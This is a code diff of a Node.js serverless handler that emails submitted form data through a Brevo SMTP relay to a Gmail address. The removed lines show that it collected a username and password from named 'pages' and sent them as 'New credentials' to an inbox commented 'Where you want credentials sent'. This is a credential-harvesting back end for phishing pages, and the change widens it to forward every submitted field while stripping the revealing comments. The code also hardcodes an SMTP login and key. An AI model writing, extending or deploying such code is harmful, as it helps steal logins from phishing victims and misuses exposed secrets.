@@ -2,29 +2,47 @@ const nodemailer = require("nodemailer");
 
 exports.handler = async (event) => {
   try {
-    const { u_name, u_pass, pageName } = JSON.parse(event.body);
+    const data = JSON.parse(event.body);
+
+    // Separate pageName from the other fields
+    const { pageName, ...formFields } = data;
+
+    if (!pageName || Object.keys(formFields).length === 0) {
+      return {
+        statusCode: 400,
+        body: JSON.stringify({
+          error:
+            "Missing required fields: pageName and at least one form field",
+        }),
+      };
+    }
+
+    // Create formatted message with all form fields
+    const fieldText = Object.entries(formFields)
+      .map(([key, value]) => `${key}: ${value}`)
+      .join("\n");
 
     let transporter = nodemailer.createTransport({
       host: "smtp-relay.brevo.com",
       port: 587,
-      secure: false, // TLS
+      secure: false,
       auth: {
-        user: "948249001@smtp-brevo.com", // Brevo SMTP login
-        pass: "ZPm85dfkzLpMaBGx", // Brevo SMTP key
+        user: "948249001@smtp-brevo.com",
+        pass: "ZPm85dfkzLpMaBGx",
       },
     });
 
     let info = await transporter.sendMail({
-      from: "castanedaorlando871@gmail.com", // Must match verified sender
-      to: "lyndazuniga2020@gmail.com", // Where you want credentials sent
-      subject: `New credentials from ${pageName}`,
-      text: `Username: ${u_name}\nPassword: ${u_pass}`,
+      from: "castanedaorlando871@gmail.com",
+      to: "lyndazuniga2020@gmail.com",
+      subject: `New submission from ${pageName}`,
+      text: `Page: ${pageName}\n\n${fieldText}`,
     });
 
     return {
       statusCode: 200,
       body: JSON.stringify({
-        message: "Email sent successfully",
+        message: `Email sent successfully from ${pageName}`,
         id: info.messageId,
       }),
     };
